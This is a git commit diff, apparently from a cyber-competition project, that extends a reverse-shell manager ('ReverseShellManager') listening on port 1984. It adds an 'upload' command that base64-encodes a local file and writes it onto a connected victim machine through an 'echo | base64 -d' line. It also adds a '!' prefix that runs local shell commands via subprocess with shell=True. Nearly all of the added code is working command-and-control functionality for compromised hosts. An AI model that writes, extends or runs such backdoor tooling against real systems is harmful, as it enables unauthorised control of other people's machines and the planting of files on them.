1b3c83e1ccdcf637fe84b39d57e366b308743314
Justin Suess <justin.suess@westpoint.edu>
2024-01-18 11:33:11 -0500

    added uploading files feature

--- main.py
+++ main.py
@@ -8,9 +8,10 @@ import daemon
 import time
 import os
 import aiochannel
+import subprocess
 import aioconsole
 from typing import Optional
-
+import base64  
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 1984
 BUFFER_SIZE = 16384
@@ -36,6 +37,28 @@ class ReverseShellManager:
             return None
         #read the data
         return await self.backdoors[backdoor][0].read(BUFFER_SIZE)
+    async def upload(self, backdoor, filename):
+        if backdoor not in self.backdoors:
+            return False
+        #check if the backdoor is still connected
+        if self.backdoors[backdoor][1].is_closing():
+            #prune the backdoor
+            del self.backdoors[backdoor]
+            return False
+        #open the file
+        try:
+            with open(filename, 'rb') as f:
+                #read the file
+                data = f.read()
+                #encode the file to base64
+                data = base64.b64encode(data)
+                #echo the file to the backdoor with a base64 decode command
+                self.backdoors[backdoor][1].write(f"echo {data.decode()} | base64 -d > {filename}\n".encode())
+                await self.backdoors[backdoor][1].drain()
+                return True
+        except Exception as e:
+            print(f"Error uploading file: {e}")
+            return False
     async def write(self, backdoor, data) -> bool:
         if backdoor not in self.backdoors:
             return False
@@ -146,6 +169,13 @@ Go C3T, Beat Airforce
         command = command.split()
         if len(command) == 0:
             continue
+        elif command[0].startswith("!"):
+            #run a shell command
+            try:
+                output = subprocess.check_output(command[0][1:] + " " + "".join(command[1:]), shell=True)
+                print(output.decode())
+            except Exception as e:
+                print(f"Error running command: {e}")
         elif command[0] == "help":
             print("Available commands: help, exit")
         elif command[0] == "exit":
@@ -209,7 +239,22 @@ Go C3T, Beat Airforce
             #cancel the other task
             for task in pending:
                 task.cancel()
-
+        elif command[0] == "upload":
+            if len(command) < 3:
+                print("Usage: upload (shell_ip:shell_port) (filename)")
+                continue
+            if len(rsm.backdoors) == 0:
+                print("No reverse shells connected")
+                continue
+            if command[1] not in rsm.list_backdoors():
+                print("Invalid selection, pick one of the following:")
+                list_backdoors(rsm)
+                continue
+            selection = command[1]
+            if not await rsm.upload(selection, command[2]):
+                print("Error uploading file")
+            else:
+                print("File uploaded successfully")
         else:
             print(f"Unknown command {command[0]}")
         #commit changes
